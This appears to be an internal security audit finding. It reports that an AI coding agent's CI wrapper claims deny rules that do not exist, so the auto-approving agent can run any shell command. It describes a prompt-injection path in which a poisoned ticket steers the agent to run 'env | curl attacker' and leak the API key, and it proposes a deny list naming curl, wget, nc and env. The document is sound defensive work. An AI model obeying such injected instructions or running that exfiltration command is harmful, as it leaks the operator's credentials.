---
id: 20260727-010-opencode-deny-rules-absent
status: open
severity: major
principle: [IV, V]
threat-model: n/a — CI/agent-automation surface
location: scripts/agent-cli/opencode.sh:22-27 vs opencode.json:36-82
first-seen-run: 20260727-8bc5f6a
first-seen-date: 2026-07-27
fix-commit: null
decision-ref: null
---

# The opencode adapter's documented CI safety net ("deny rules") does not exist

## What the code does

`scripts/agent-cli/opencode.sh:22-27` states:

> opencode.json denies edit/bash on sensitive paths; `--auto` cannot override deny rules.
> CI safety therefore comes from (a) the collaborator check and (b) opencode.json's deny rules.

But `opencode.json`'s `permission.bash` map contains **zero `deny` entries** — only `allow`
patterns plus a `"*": "ask"` fallthrough:

```
$ python3 -c "import json;print([k for k,v in json.load(open('opencode.json'))['permission']['bash'].items() if v=='deny'])"
[]
```

`--auto` is passed unconditionally at `opencode.sh:41`, and CI sets `AUTO_APPROVE=true`.
Under `--auto`, opencode auto-approves everything not explicitly *denied* — so every `ask`
becomes an auto-yes. Safety net (b) is therefore illusory: in the `run` job the agent can
execute **any** bash command, with `ANTHROPIC_API_KEY` and (pre-20260727-004) a repo-write
`GITHUB_TOKEN` in the environment.

## Why it leaks

Constitution Principle V's honesty expectation: a security control is documented as present
but is absent. Anyone reasoning about the workflow's blast radius — including a reviewer
assessing 20260727-004 or 20260727-005 — will over-credit the containment.

Concrete residual path, independent of the injection fixed in 20260727-004: a poisoned
in-repo ticket file, or a prompt-injection payload embedded in a ticket's Context section
(which `scripts/run-task.sh:235-249` copies verbatim into the agent prompt), steers the
auto-approved agent to `env | curl attacker`, exfiltrating the provider key. That path is now
collaborator-gated, but the control that would *contain* it does not exist.

## Suggested fix

Pick one and make the docs match:

1. **Implement the claimed control:** add real `deny` rules for network- and exfil-prone
   commands (`curl`, `wget`, `nc`, `env`, `printenv`, writes outside the repo) and drop the
   broad `bash: allow` patterns.
2. **Or delete the claim** from `opencode.sh:22-27` and state plainly that CI safety rests on
   the collaborator check alone.

Independently of which: do not put a long-lived provider key in a job that runs an
auto-approving agent. Use short-lived, scoped credentials (see 20260727-005).

## Regression test

A contract test asserting that if `opencode.sh` passes `--auto`, then `opencode.json` defines
a non-empty `deny` set — i.e. the documented invariant is machine-checked rather than
asserted in a comment.

## Related

- Found during the 2026-07-27 milestone audit (`.scratch/audit.md`, finding S9).
- Containment counterpart to 20260727-004 (which fixed the *entry* path, not the blast radius).
